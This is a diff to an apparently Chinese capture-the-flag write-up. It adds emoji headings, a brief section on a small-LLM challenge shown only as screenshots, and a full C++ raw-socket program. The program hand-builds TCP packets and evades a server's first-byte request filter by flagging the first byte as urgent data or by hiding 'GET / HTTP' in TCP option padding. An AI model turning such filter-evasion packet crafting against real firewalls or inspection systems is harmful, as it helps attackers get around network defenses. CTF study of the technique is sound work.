@@ -286,13 +286,25 @@ cod_dict += ['#ty9kxborszstguyd?!blm-p']
 
 运行一遍即可得到 flag
 
-## 高频率星球
+## 🪐 高频率星球
 
 去掉记录文件头尾一些无用的行和转义字符，仅保留 js 代码部分，然后使用 `asciinema_restore.rec > flag.js` 即可得到脚本文件
 
 输出的文件会包含一些非法字符，正则搜索 `\x1b` 相关内容，替换掉这些非法部分即可
 
-## 低带宽星球
+## 🪐 小型大语言模型星球
+
+### You Are Smart
+
+用魔法打败魔法（
+
+![](images/you-are-smart-1.png)
+
+![](images/you-are-smart-2.png)
+
+## 🪐 流式星球
+
+## 🪐 低带宽星球
 
 ### 小试牛刀
 
@@ -335,6 +347,276 @@ def do_post(data: str):
 
 
 do_post('YOUR_TOKEN')
+```
+
+### 我的 P、我的 GET
+
+后两问需要用 Raw Socket 自己实现 TCP 协议
+
+对于第二问，没有采用和官方一致的解法，而是通过紧急指针将第一个字节设置为紧急数据，绕过针对首字母 `P` 的检测；第三问则是设置 TCP 选项，将 `GET / HTTP` 塞进选项后面用于填充对齐的部分，从而通过检查
+
+```c++
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+
+#include <random>
+
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <sys/unistd.h>
+
+#define RESTART "/proc/self/exe"
+
+
+class error {
+private:
+    const char* message;
+
+public:
+    explicit error(const char *message) : message(message) { }
+
+    template<typename T>
+    friend T operator | (T value, error err);
+};
+
+template<typename T>
+T operator | (T value, error err) {
+    if (value == -1) {
+        perror(err.message);
+        exit(1);
+    }
+    return value;
+}
+
+
+int random_port() {
+    std::random_device dev;
+    std::default_random_engine gen(dev());
+    std::uniform_int_distribution<int> distribution(0, 1000);
+    return 20000 + distribution(gen);
+}
+
+struct pseudo_header {
+    uint32_t src_addr;
+    uint32_t dst_addr;
+    uint8_t placeholder;
+    uint8_t protocol;
+    uint16_t tcp_length;
+};
+
+struct transmission_buffer {
+    pseudo_header ph;
+    char data[4096];
+};
+
+
+class tcp_custom {
+private:
+    int fd = -1;
+    transmission_buffer buffer;
+    sockaddr_in local, remote;
+    const char *options = nullptr;
+    int options_len = 0;
+    int data_len = 0;
+    int seq = 0, ack_seq = 0;
+
+    void update_ph() {
+        buffer.ph = {
+            .src_addr = local.sin_addr.s_addr,
+            .dst_addr = remote.sin_addr.s_addr,
+            .placeholder = 0,
+            .protocol = IPPROTO_TCP,
+            .tcp_length = htons(sizeof(tcphdr) + options_len + data_len)
+        };
+    }
+
+    uint16_t checksum() {
+        auto *ptr = (uint16_t *) &buffer;
+        int len = sizeof(pseudo_header) + ntohs(buffer.ph.tcp_length);
+
+        int sum = 0;
+
+        while (len > 1) {
+            sum += ntohs(*ptr++);
+            len -= 2;
+        }
+
+        if (len == 1) {
+            sum += ntohs(*(uint8_t *) ptr);
+        }
+
+        while (sum >> 16) {
+            sum = (sum >> 16) + (sum & 0xFFFF);
+        }
+
+        return (uint16_t) htons(~sum);
+    }
+
+    void send(const char *data, tcphdr *override) {
+        auto *tcph = (tcphdr *) buffer.data;
+        memset(tcph, 0, sizeof(tcphdr));
+        tcph->source = local.sin_port;
+        tcph->dest = remote.sin_port;
+        tcph->seq = htonl(seq);
+        tcph->doff = (sizeof(tcphdr) + options_len) / 4;
+        tcph->window = htons(65535);
+
+        if (override) {
+            override->syn && (tcph->syn = 1);
+            override->psh && (tcph->psh = 1);
+            override->ack && (tcph->ack = 1);
+            override->urg && (tcph->urg = 1);
+        }
+
+        if (tcph->ack) {
+            tcph->ack_seq = htonl(ack_seq);
+        }
+
+        data_len = data ? strlen(data) : 0;
+
+        // copy options and data
+        options_len && memcpy(buffer.data + sizeof(tcphdr), options, options_len);
+        data_len && memcpy(buffer.data + sizeof(tcphdr) + options_len, data, data_len);
+
+        // calculate checksum
+        update_ph();
+        tcph->check = checksum();
+
+        sendto(fd, buffer.data, sizeof(tcphdr) + options_len + data_len, 0, (sockaddr *) &remote, sizeof(sockaddr)) | error("sendto");
+        seq += tcph->syn ? 1 : data_len;
+    }
+
+    int recv() {
+        int count;
+
+        for (;;) {
+            count = recvfrom(fd, buffer.data, sizeof(buffer.data), 0, nullptr, nullptr) | error("recvfrom");
+
+            auto *header = (tcphdr *) (buffer.data + sizeof(iphdr));
+            if (header->dest == local.sin_port) {
+                ack_seq = ntohl(header->seq) + 1;
+                break;
+            }
+        }
+
+        count -= sizeof(iphdr);
+        memcpy(buffer.data, buffer.data + sizeof(iphdr), count);  // trim IP header
+
+        return count;
+    }
+
+public:
+    explicit tcp_custom(int fd) : fd(fd) {
+        memset(&buffer, 0, sizeof(buffer));
+    }
+
+    void bind(const char *addr, int port) {
+        local = {
+            .sin_family = AF_INET,
+            .sin_port = htons(port),
+            .sin_addr = {
+                .s_addr = inet_addr(addr)
+            }
+        };
+    }
+
+    void connect(const char *addr, int port) {
+        remote = {
+            .sin_family = AF_INET,
+            .sin_port = htons(port),
+            .sin_addr = {
+                .s_addr = inet_addr(addr)
+            }
+        };
+    }
+
+    void set_options(const char *opts, int length) {
+        options = opts;
+        options_len = length;
+    }
+
+    void handshake() {
+        tcphdr override;
+        memset(&override, 0, sizeof(override));
+
+        override.syn = 1;
+
+        send(nullptr, &override);
+        recv();
+
+        override.syn = 0;
+        override.ack = 1;
+
+        send(nullptr, &override);
+    }
+
+    void send_data(char *buf, int urg = 0) {
+        tcphdr override;
+        memset(&override, 0, sizeof(override));
+        override.ack = 1;
+        override.psh = 1;
+        override.urg = urg;
+        send(buf, &override);
+        recv();  // ack
+    }
+
+    void recv_data(char *buf) {
+        memset(buffer.data, 0, sizeof(buffer.data));
+        int count = recv();
+        memcpy(buf, buffer.data + sizeof(tcphdr), count - sizeof(tcphdr));
+    }
+};
+
+
+int main(int argc, char *argv[]) {
+    int flag = argc == 2 ? (int) strtol(argv[1], nullptr, 10) : 2;
+
+    const char *const local_addr = "192.168.2.3";
+    const char *const remote_addr = "202.38.93.111";
+    const int local_port = random_port();
+    const int remote_port = 18079 + flag;
+
+    const char *token = getenv("TOKEN");
+    char data[256], buffer[256] = {0};
+    sprintf(data, "#POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: %zu\r\n\r\n%s", strlen(token), token);
+
+    printf("flag-%d:\n", flag);
+    fflush(stdout);
+
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP) | error("socket");
+    auto protocol = tcp_custom(fd);
+
+    protocol.bind(local_addr, local_port);
+    protocol.connect(remote_addr, remote_port);
+
+    switch (flag) {
+        case 2:
+            protocol.handshake();
+            protocol.send_data(data, 1);
+            protocol.recv_data(buffer);
+            break;
+        case 3:
+            const char options[] = "\x00GET / HTTP\x00";
+            protocol.set_options(options, sizeof(options) - 1);
+            protocol.handshake();
+            protocol.send_data(data + 1);
+            protocol.recv_data(buffer);
+            break;
+    }
+
+    printf("%s\n", buffer);
+    fflush(stdout);
+
+    if (flag == 2) {
+        execl(RESTART, RESTART, "3", nullptr);
+    }
+
+    return 0;
+}
+
 ```
 
 ## 为什么要打开 /flag 
